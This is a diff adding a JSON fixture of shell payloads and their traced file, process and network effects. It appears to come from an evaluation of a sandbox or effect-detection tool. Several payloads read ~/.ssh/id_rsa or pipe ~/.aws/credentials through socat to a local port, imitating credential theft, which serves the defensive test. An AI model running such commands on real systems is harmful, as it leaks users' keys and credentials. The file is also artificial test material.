@@ -1,0 +1,468 @@
+[
+ {
+  "id": "background-write-after-call",
+  "payload": "( sleep 0.3; echo late > \"$PWD/late.txt\" ) & disown; true",
+  "truthEffects": [
+   {
+    "what": "exec",
+    "path": "/usr/bin/bash",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libtinfo.so.6",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/dev/null",
+    "pid": 12676
+   },
+   {
+    "what": "exec",
+    "path": "/usr/bin/sleep",
+    "pid": 12677
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": 12677
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": 12677
+   },
+   {
+    "what": "write",
+    "path": "/tmp/derm-eval-effects-ceOJGe/home/proj/late.txt",
+    "pid": null
+   }
+  ],
+  "costMs": 327.160445,
+  "bareCostMs": 306.415615
+ },
+ {
+  "id": "postinstall-writes-outside",
+  "payload": "echo x > \"$HOME/outside.txt\"",
+  "truthEffects": [
+   {
+    "what": "exec",
+    "path": "/usr/bin/bash",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libtinfo.so.6",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": null
+   },
+   {
+    "what": "write",
+    "path": "/tmp/derm-eval-effects-2Dv7WP/home/outside.txt",
+    "pid": null
+   }
+  ],
+  "costMs": 15.244222,
+  "bareCostMs": 4.146187
+ },
+ {
+  "id": "read-then-exfil",
+  "payload": "cat \"$HOME/.aws/credentials\" | socat - TCP:127.0.0.1:34863,connect-timeout=2 2>/dev/null || true",
+  "truthEffects": [
+   {
+    "what": "exec",
+    "path": "/usr/bin/bash",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libtinfo.so.6",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": null
+   },
+   {
+    "what": "exec",
+    "path": "/usr/bin/cat",
+    "pid": 12694
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": 12694
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": 12694
+   },
+   {
+    "what": "write",
+    "path": "/dev/null",
+    "pid": 12695
+   },
+   {
+    "what": "exec",
+    "path": "/usr/bin/socat",
+    "pid": 12695
+   },
+   {
+    "what": "read",
+    "path": "/tmp/derm-eval-effects-iAq1LH/home/.aws/credentials",
+    "pid": 12694
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": 12695
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libwrap.so.0",
+    "pid": 12695
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libssl.so.3",
+    "pid": 12695
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libcrypto.so.3",
+    "pid": 12695
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": 12695
+   },
+   {
+    "what": "connect",
+    "host": "127.0.0.1",
+    "pid": 12695
+   }
+  ],
+  "costMs": 29.821126,
+  "bareCostMs": 7.76484
+ },
+ {
+  "id": "spawned-server-connects",
+  "payload": "bash -c 'printf x | socat - TCP:127.0.0.1:45261,connect-timeout=2 2>/dev/null || true'",
+  "truthEffects": [
+   {
+    "what": "exec",
+    "path": "/usr/bin/bash",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libtinfo.so.6",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": null
+   },
+   {
+    "what": "exec",
+    "path": "/usr/bin/bash",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libtinfo.so.6",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": null
+   },
+   {
+    "what": "fork",
+    "pid": null,
+    "child": 12709
+   },
+   {
+    "what": "write",
+    "path": "/dev/null",
+    "pid": 12710
+   },
+   {
+    "what": "exec",
+    "path": "/usr/bin/socat",
+    "pid": 12710
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": 12710
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libwrap.so.0",
+    "pid": 12710
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libssl.so.3",
+    "pid": 12710
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libcrypto.so.3",
+    "pid": 12710
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": 12710
+   },
+   {
+    "what": "connect",
+    "host": "127.0.0.1",
+    "pid": 12710
+   }
+  ],
+  "costMs": 36.175827,
+  "bareCostMs": 6.973859
+ },
+ {
+  "id": "subprocess-reads-key",
+  "payload": "bash -c 'cat \"$HOME/.ssh/id_rsa\" > /dev/null'",
+  "truthEffects": [
+   {
+    "what": "exec",
+    "path": "/usr/bin/bash",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libtinfo.so.6",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": null
+   },
+   {
+    "what": "exec",
+    "path": "/usr/bin/bash",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libtinfo.so.6",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": null
+   },
+   {
+    "what": "fork",
+    "pid": null,
+    "child": 12719
+   },
+   {
+    "what": "write",
+    "path": "/dev/null",
+    "pid": 12719
+   },
+   {
+    "what": "exec",
+    "path": "/usr/bin/cat",
+    "pid": 12719
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": 12719
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": 12719
+   },
+   {
+    "what": "read",
+    "path": "/tmp/derm-eval-effects-MWYfG1/home/.ssh/id_rsa",
+    "pid": 12719
+   }
+  ],
+  "costMs": 29.972151,
+  "bareCostMs": 6.089109
+ },
+ {
+  "id": "test-run-connects-out",
+  "payload": "printf x | socat - TCP:127.0.0.1:59409,connect-timeout=2 2>/dev/null || true",
+  "truthEffects": [
+   {
+    "what": "exec",
+    "path": "/usr/bin/bash",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libtinfo.so.6",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": null
+   },
+   {
+    "what": "write",
+    "path": "/dev/null",
+    "pid": 12732
+   },
+   {
+    "what": "exec",
+    "path": "/usr/bin/socat",
+    "pid": 12732
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": 12732
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libwrap.so.0",
+    "pid": 12732
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libssl.so.3",
+    "pid": 12732
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libcrypto.so.3",
+    "pid": 12732
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": 12732
+   },
+   {
+    "what": "connect",
+    "host": "127.0.0.1",
+    "pid": 12732
+   }
+  ],
+  "costMs": 22.028846,
+  "bareCostMs": 5.482332
+ },
+ {
+  "id": "test-run-reads-ssh-key",
+  "payload": "cat \"$HOME/.ssh/id_rsa\" > /dev/null",
+  "truthEffects": [
+   {
+    "what": "exec",
+    "path": "/usr/bin/bash",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libtinfo.so.6",
+    "pid": null
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": null
+   },
+   {
+    "what": "write",
+    "path": "/dev/null",
+    "pid": 12741
+   },
+   {
+    "what": "exec",
+    "path": "/usr/bin/cat",
+    "pid": 12741
+   },
+   {
+    "what": "read",
+    "path": "/etc/ld.so.cache",
+    "pid": 12741
+   },
+   {
+    "what": "read",
+    "path": "/lib/x86_64-linux-gnu/libc.so.6",
+    "pid": 12741
+   },
+   {
+    "what": "read",
+    "path": "/tmp/derm-eval-effects-KCMl0t/home/.ssh/id_rsa",
+    "pid": 12741
+   }
+  ],
+  "costMs": 16.594042,
+  "bareCostMs": 3.95177
+ }
+]
